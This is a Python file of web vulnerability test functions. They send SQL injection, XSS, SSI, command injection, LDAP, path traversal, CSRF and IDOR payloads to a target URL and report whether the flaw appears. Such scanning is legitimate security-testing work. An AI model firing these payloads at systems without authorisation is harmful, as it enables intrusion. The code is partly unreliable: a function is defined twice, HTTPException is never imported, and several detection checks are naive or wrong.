# vulnerability_detection_functions.py
from typing import Tuple
import requests
import pickle


def test_sql_injection(url:str, vulnerable_parameter:str):
    # Malicious SQL injection payload
    payload = f"' OR 1=1 --"

    # Construct the URL with the payload
    url_with_payload = f"{url}?{vulnerable_parameter}={payload}"

    try:
        response = requests.get(url_with_payload)
        if response.status_code == 200:
            if "logged in as admin" in response.text:
                return True, "SQL Injection vulnerability detected."
            else:
                return False, "No evidence of SQL Injection vulnerability."
        else:
            return False, f"Failed to retrieve {url_with_payload}. Status code: {response.status_code}"
    except Exception as e:
        return False, f"An error occurred: {str(e)}"

def test_xss(url: str) -> bool:
    xss_payloads = [
        # HTML context payloads
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "<a href='javascript:alert(`XSS`)'>Click me</a>",
        # JavaScript context payloads
        "');alert('XSS');('",
        "`;alert('XSS');`",
        "eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))",
        # Attribute context payloads
        "javascript:alert('XSS')",
        "' onload=alert('XSS')",
        "\" onload=alert('XSS')",
        # Event handler payloads
        "<img src=# onerror=this.src='javascript:alert(`XSS`)'>",
        "onmouseover=alert('XSS')"
        # Add more payloads as needed
    ]

    for payload in xss_payloads:
        try:
            response = requests.post(url, data={"input": payload})
            if response.status_code == 200 and payload in response.text:
                return True
        except Exception as e:
            print(f"Error testing XSS: {e}")

    return False

# def test_xss(url: str) -> Tuple[bool, str]:
#     try:
#         # Malicious XSS payload
#         payload = "<script>alert('XSS');</script>"
#         response = requests.post(url, data={"input": payload})
#         if response.status_code == 200 and "<script>alert('XSS');</script>" in response.text:
#             return True, "XSS vulnerability detected."
#         else:
#             return False, "No evidence of XSS vulnerability."
#     except Exception as e:
#         raise Exception(f"Error in test_xss: {str(e)}")

def check_directory_listing(url: str) -> Tuple[bool, str]:
    try:
        response = requests.get(url)
        if response.status_code == 200:
            if "Index of /" in response.text:
                return True, "Directory listing is enabled."
            else:
                return False, "Directory listing is not enabled."
        else:
            return False, f"Failed to retrieve {url}. Status code: {response.status_code}"
    except Exception as e:
        raise Exception(f"Error occurred: {str(e)}")

def test_ssi_injection(url: str) -> Tuple[bool, str]:
    try:
        # Malicious SSI payload
        payload = "<!--#exec cmd='ls -la' -->"
        response = requests.get(url + payload)
        if "etc" in response.text:
            return True, "SSI Injection vulnerability detected."
        else:
            return False, "No evidence of SSI Injection vulnerability."
    except Exception as e:
        raise Exception(f"Error in test_ssi_injection: {str(e)}")

def test_session_fixation(url: str, session_id: str) -> Tuple[bool, str]:
    try:
        # Send a request to set session ID
        set_session_response = requests.get(url)

        # Use the provided session ID for subsequent requests
        session_id_payload = {"session_id": session_id}
        response = requests.post(url, data=session_id_payload)

        if "Logged in as admin" in response.text:
            return True, "Session Fixation vulnerability detected."
        else:
            return False, "No evidence of Session Fixation vulnerability."
    except Exception as e:
        raise Exception(f"Error in test_session_fixation: {str(e)}")

def test_command_injection(url: str) -> Tuple[bool, str]:
    try:
        # Malicious command injection payload
        payload = "; ls"
        response = requests.get(url + payload)
        if "etc" in response.text:
            return True, "Command Injection vulnerability detected."
        else:
            return False, "No evidence of Command Injection vulnerability."
    except Exception as e:
        raise Exception(f"Error in test_command_injection: {str(e)}")

def test_ldap_injection(url: str) -> Tuple[bool, str]:
    try:
        # Malicious LDAP injection payload
        payload = "*)(uid=*))(|(uid=*"
        response = requests.get(url + payload)
        if "CN=*" in response.text:
            return True, "LDAP Injection vulnerability detected."
        else:
            return False, "No evidence of LDAP Injection vulnerability."
    except Exception as e:
        raise Exception(f"Error in test_ldap_injection: {str(e)}")

def test_object_injection(url: str) -> Tuple[bool, str]:
    try:
        # Malicious object injection payload
        payload = pickle.dumps(['example_data'])
        response = requests.post(url, data=payload)
        if "example_data" in response.text:
            return True, "Object Injection vulnerability detected."
        else:
            return False, "No evidence of Object Injection vulnerability."
    except Exception as e:
        raise Exception(f"Error in test_object_injection: {str(e)}")

def test_path_traversal(url: str) -> Tuple[bool, str]:
    try:
        # Malicious path traversal payload
        payload = "../../../etc/passwd"
        response = requests.get(url + payload)
        if "root:" in response.text:
            return True, "Path Traversal vulnerability detected."
        else:
            return False, "No evidence of Path Traversal vulnerability."
    except Exception as e:
        raise Exception(f"Error in test_path_traversal: {str(e)}")

def test_sql_injection(url: str) -> Tuple[bool, str]:
    try:
        # Malicious SQL injection payload
        payload = "' OR 1=1 --"
        response = requests.post(url, data={"username": payload, "password": "password"})
        if "Logged in as admin" in response.text:
            return True, "SQL Injection vulnerability detected."
        else:
            return False, "No evidence of SQL Injection vulnerability."
    except Exception as e:
        raise Exception(f"Error in test_sql_injection: {str(e)}")

def test_default_credentials(url: str, username: str, password: str) -> Tuple[bool, str]:
    try:
        response = requests.get(url, auth=(username, password))
        if response.status_code == 200:
            return True, f"Default credentials '{username}:{password}' work."
        else:
            return False, f"Failed to authenticate with default credentials '{username}:{password}'. Status code: {response.status_code}"
    except Exception as e:
        return False, f"An error occurred: {str(e)}"

def test_csrf(url: str, csrf_token: str) -> tuple:
    try:
        # Craft a malicious request with CSRF token
        malicious_request = {
            "action": "transfer_funds",
            "amount": "1000",
            "destination_account": "attacker_account",
            "csrf_token": csrf_token  # Adding CSRF token to the request
            # Add more parameters as needed
        }

        # Send the malicious request
        response = requests.post(url, data=malicious_request)

        # Check if the request was successful
        response.raise_for_status()

        # Check if the funds were transferred successfully
        if "Funds transferred successfully" in response.text:
            return True, "CSRF vulnerability detected."
        else:
            return False, "No evidence of CSRF vulnerability."

    except requests.exceptions.RequestException as e:
        return False, f"Failed to send the request: {e}"

    except Exception as e:
        return False, f"An unexpected error occurred: {e}"


def test_idor(url: str) -> tuple:
    try:
        # Craft a request to access a resource that shouldn't be accessible
        malicious_request = f"{url}/user?id=2"  # Replace '2' with the ID of another user

        # Send the malicious request
        response = requests.get(malicious_request)

        # Check if the request was successful
        response.raise_for_status()

        # Check if the response indicates IDOR vulnerability
        if "Internal Server Error" in response.text:
            return True, "IDOR vulnerability detected."
        else:
            return False, "No evidence of IDOR vulnerability."

    except requests.exceptions.RequestException as e:
        return False, f"Failed to send the request: {e}"

    except Exception as e:
        return False, f"An unexpected error occurred: {e}"

def test_broken_authentication(url: str, username: str, password: str) -> tuple:
    try:
        # Craft a request to authenticate with the provided credentials
        login_data = {
            "username": username,
            "password": password
        }

        # Send the authentication request
        response = requests.post(url, data=login_data)

        # Check if the request was successful
        response.raise_for_status()

        # Check if the response indicates successful authentication
        if "Login successful" in response.text:
            return True, "Broken Authentication vulnerability detected."
        else:
            return False, "No evidence of Broken Authentication vulnerability."

    except requests.exceptions.RequestException as e:
        return False, f"Failed to authenticate: {e}"

    except Exception as e:
        return False, f"An unexpected error occurred: {e}"


def test_sensitive_data_exposure(url: str) -> Tuple[bool, str]:
    try:
        # Send a GET request to the specified URL
        response = requests.get(url)

        # Check if the request was successful
        response.raise_for_status()

        # Check if the response contains sensitive information
        if "Credit Card Number" in response.text:
            return True, "Sensitive Data Exposure vulnerability detected."
        else:
            return False, "No evidence of Sensitive Data Exposure vulnerability."

    except requests.exceptions.RequestException as e:
        raise HTTPException(status_code=500, detail=f"Failed to retrieve data: {e}")

    except Exception as e:
        raise HTTPException(status_code=500, detail=f"An unexpected error occurred: {e}")
